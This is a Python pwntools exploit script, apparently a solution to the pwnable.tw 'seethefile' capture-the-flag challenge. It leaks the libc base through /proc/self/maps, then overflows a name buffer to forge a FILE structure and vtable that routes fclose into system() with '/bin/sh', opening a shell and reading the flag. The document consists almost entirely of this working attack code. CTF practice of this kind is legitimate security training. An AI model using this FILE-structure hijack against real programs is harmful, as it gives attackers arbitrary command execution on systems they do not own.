#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("seethefile_patched")
libc = ELF('./libc_32.so.6')

local = False

if local:
    p = process("./seethefile_patched")
    gdb.attach(p,'''b*main+169\nc''')
else:
    p = remote('chall.pwnable.tw', 10200)

elf = context.binary = ELF('./seethefile_patched', checksec=False)

def openfile(data):
    p.sendlineafter(b"Your choice :", b"1")
    p.sendlineafter(b"What do you want to see :", data)
    print("Openfile")

def readfile():
    p.sendlineafter(b"Your choice :", b"2")
    print("Readfile")


def writefile():
    p.sendlineafter(b"Your choice :", b"3")
    print("Writefile")

def closefile():
    p.sendlineafter(b"Your choice :", b"4")
    print("Closefile")

def getname(data):
    p.sendlineafter(b"Your choice :", b"5")
    p.sendlineafter(b"Leave your name :", data)
    print("Exit")

openfile('/proc/self/maps')
readfile()
readfile()
writefile()

p.recvuntil(b"00:00 0", )
libc.address = int(p.recv(10),16)
print("[+]Libc_base:   ", hex(libc.address))
print("[+]Libc_binsh:  ", hex(next(libc.search(b'/bin/sh'))))
print("[+]Libc_system: ", hex(libc.sym['system']))

payload = p32(0xFFFFDFFF)                         # file->_flags  set _IO_IS_FILEBUF bit to false
payload += b";/bin/sh;"                             # file->???     to be interpreted as a string

payload += b"a"*19                   # padding to reach *fp
payload += p32(elf.symbols['name'])             # *fp           overwrite *fp to point to the start of the name buffer
payload += b'`'                                  # padding
payload += b'A' * (72-37)                        # padding
payload += p32(elf.symbols['filename'] + 32)    # file->_lock   vtable->__dummy
payload += p32(elf.symbols['name'] + 72)        # file->vtable  vtable->__dummy2
payload += p32(libc.symbols['system'])          #               vtable->__finish

getname(payload)
p.sendline(b"cd /home/seethefile")
p.sendline(b"cat flag")
'''
'''
p.interactive()